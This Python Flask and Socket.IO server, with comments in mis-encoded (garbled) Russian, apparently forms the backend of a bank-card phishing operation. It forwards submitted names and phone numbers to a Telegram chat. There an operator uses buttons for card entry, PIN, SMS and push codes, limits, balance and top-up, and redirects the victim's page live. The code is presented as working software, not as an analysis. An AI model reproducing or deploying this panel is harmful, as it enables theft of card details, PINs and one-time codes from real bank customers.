import os
import time
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Flask
app = Flask(__name__)
CORS(app)  # –†–∞–∑—Ä–µ—à–∞–µ–º –∑–∞–ø—Ä–æ—Å—ã —Å –¥—Ä—É–≥–∏—Ö –¥–æ–º–µ–Ω–æ–≤
socketio = SocketIO(app, cors_allowed_origins="*")

# –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    print("‚ùå –û—à–∏–±–∫–∞: TELEGRAM_BOT_TOKEN –∏–ª–∏ CHAT_ID –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã!")

print(f"üîπ –ó–∞–≥—Ä—É–∂–µ–Ω TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"üîπ –ó–∞–≥—Ä—É–∂–µ–Ω CHAT_ID (—Ç–∏–ø {type(CHAT_ID)}): {CHAT_ID}")

# üì© –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
@app.route('/send-to-telegram', methods=['POST'])
def send_to_telegram():
    """–ü—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞ –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∏—Ö –≤ Telegram"""
    try:
        data = request.json
        print(f"üì© –ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ: {data}")

        if TELEGRAM_BOT_TOKEN is None or CHAT_ID is None:
            return jsonify({"error": "–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã"}), 500

        user_id = str(int(time.time()))
        user_info = f"üì© –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å:\n\n–ò–º—è: {data.get('name', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n–¢–µ–ª–µ—Ñ–æ–Ω: {data.get('phone', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: {data.get('comment', '–ù–µ—Ç')}"

        # ‚úÖ –°–æ–∑–¥–∞—ë–º –∫–∞—Å—Ç–æ–º–Ω–æ–µ –º–µ–Ω—é
        keyboard = {
            "inline_keyboard": [
                [{"text": "SMS", "callback_data": f"redirect_sms:{user_id}"}, {"text": "–ü—É—à", "callback_data": f"push:{user_id}"},
                 {"text": "–í–≤–æ–¥ –∫–∞—Ä—Ç—ã", "callback_data": f"card:{user_id}"}, {"text": "PIN", "callback_data": f"pin:{user_id}"}],
                
                [{"text": "–õ–∏–º–∏—Ç—ã", "callback_data": f"limits:{user_id}"}, {"text": "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥", "callback_data": f"wrong_code:{user_id}"},
                 {"text": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", "callback_data": f"phone_number:{user_id}"}],
                
                [{"text": "–°–≤–æ–π —Ç–µ–∫—Å—Ç/—Ñ–æ—Ç–æ", "callback_data": f"custom_text:{user_id}"}],
                
                [{"text": "–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ", "callback_data": f"topup:{user_id}"}, {"text": "–ë–∞–ª–∞–Ω—Å", "callback_data": f"balance:{user_id}"}],
                
                [{"text": "‚úÖ –£—Å–ø–µ—Ö", "callback_data": f"success:{user_id}"}, {"text": "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –õ–ö", "callback_data": f"wrong_lk:{user_id}"}]
            ]
        }

        payload = {
            "chat_id": CHAT_ID,
            "text": user_info,
            "reply_markup": keyboard
        }

        print(f"üì© –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram: {payload}")

        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload)
        
        print(f"üì© –û—Ç–≤–µ—Ç –æ—Ç Telegram: {response.status_code}, {response.text}")

        if response.status_code != 200:
            return jsonify({"error": "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram", "telegram_response": response.text}), 500

        return jsonify({"status": "‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –æ–ø–µ—Ä–∞—Ç–æ—Ä—É"})

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {str(e)}")
        return jsonify({"error": f"‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {str(e)}"}), 500

# üì© –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏–π –∫–Ω–æ–ø–æ–∫ –≤ –±–æ—Ç–µ
@app.route('/callback', methods=['POST'])
def handle_callback():
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –Ω–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–æ–∫ –≤ –±–æ—Ç–µ"""
    try:
        data = request.json
        print(f"üì© –ü–æ–ª—É—á–µ–Ω callback –æ—Ç Telegram: {data}")

        if "callback_query" not in data:
            return jsonify({"error": "callback_query –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"}), 400

        callback_query = data["callback_query"]
        callback_data = callback_query.get("data")
        chat_id = callback_query["message"]["chat"]["id"]

        if not callback_data:
            return jsonify({"error": "–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç data"}), 400

        action, user_id = callback_data.split(":")

        if action == "redirect_sms":
            print(f"‚úÖ –û–ø–µ—Ä–∞—Ç–æ—Ä –≤—ã–±—Ä–∞–ª SMS –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
            socketio.emit('redirect', {'user_id': user_id, 'url': "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"})
            response_text = "üì© SMS –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∫–ª–∏–µ–Ω—Ç–∞ –æ–±–Ω–æ–≤–∏—Ç—Å—è."

        elif action == "success":
            response_text = "‚úÖ –£—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ!"

        elif action == "wrong_lk":
            response_text = "‚ùå –û—à–∏–±–∫–∞: –ù–µ–≤–µ—Ä–Ω—ã–π –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç."

        elif action in ["push", "card", "pin", "limits", "wrong_code", "phone_number", "custom_text", "topup", "balance"]:
            response_text = f"‚ÑπÔ∏è –û–ø–µ—Ä–∞—Ç–æ—Ä –≤—ã–±—Ä–∞–ª: {action.replace('_', ' ').capitalize()}."

        else:
            return jsonify({"error": "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞"}), 400

        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": response_text
        }

        response = requests.post(telegram_url, json=payload)
        print(f"üì© –û—Ç–≤–µ—Ç –æ—Ç Telegram: {response.status_code}, {response.text}")

        return jsonify({"message": "‚úÖ Callback –æ–±—Ä–∞–±–æ—Ç–∞–Ω!"})

    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {str(e)}")
        return jsonify({"error": f"‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {str(e)}"}), 500

# –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), allow_unsafe_werkzeug=True, debug=True)
